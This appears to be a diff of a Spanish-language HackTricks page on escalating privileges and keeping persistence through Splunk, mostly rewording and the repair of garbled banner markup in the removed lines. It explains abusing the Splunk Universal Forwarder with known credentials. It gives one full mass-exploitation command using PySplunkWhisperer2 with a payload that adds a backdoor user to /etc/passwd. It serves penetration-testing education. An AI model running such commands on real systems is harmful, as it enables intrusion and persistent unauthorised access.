@@ -1,35 +1,32 @@
 # Splunk LPE y Persistencia
 
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Apoya a HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
-Si **enumerando** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (puerto 8090), si tienes la suerte de conocer alguna **credencial válida** puedes **abusar del servicio Splunk** para **ejecutar un shell** como el usuario que ejecuta Splunk. Si root lo está ejecutando, puedes escalar privilegios a root.
+Si **enumerando** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (puerto 8090), si tienes la suerte de conocer alguna **credencial válida** puedes **abusar del servicio de Splunk** para **ejecutar un shell** como el usuario que ejecuta Splunk. Si lo está ejecutando root, puedes escalar privilegios a root.
 
-Además, si ya eres root y el servicio Splunk no está escuchando solo en localhost, puedes **robar** el **archivo** de **contraseñas** **del** servicio Splunk y **crackear** las contraseñas, o **agregar nuevas** credenciales a él. Y mantener persistencia en el host.
+Además, si ya eres root y el servicio de Splunk no está escuchando solo en localhost, puedes **robar** el archivo de **contraseñas** **del** servicio de Splunk y **crackear** las contraseñas, o **agregar nuevas** credenciales a él. Y mantener persistencia en el host.
 
 En la primera imagen a continuación puedes ver cómo se ve una página web de Splunkd.
 
-## Resumen de la Explotación del Agente Universal Forwarder de Splunk
+## Resumen de la Explotación del Agente Splunk Universal Forwarder
 
 Para más detalles, consulta la publicación [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este es solo un resumen:
 
 **Descripción de la Explotación:**
-Una explotación dirigida al Agente Universal Forwarder de Splunk (UF) permite a los atacantes con la contraseña del agente ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente toda una red.
+Una explotación que apunta al Agente Splunk Universal Forwarder (UF) permite a los atacantes con la contraseña del agente ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente toda una red.
 
 **Puntos Clave:**
 - El agente UF no valida las conexiones entrantes ni la autenticidad del código, lo que lo hace vulnerable a la ejecución no autorizada de código.
@@ -46,7 +43,7 @@ Una explotación dirigida al Agente Universal Forwarder de Splunk (UF) permite a
 - Potencial para deshabilitar el registro para evadir la detección.
 - Instalación de puertas traseras o ransomware.
 
-**Ejemplo de Comando para la Explotación:**
+**Comando de Ejemplo para la Explotación:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
@@ -60,23 +57,17 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 
 **Para más detalles, consulta la publicación [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
-{% h*nt styCe="Vacceas" %}
-AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>Apoya a HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
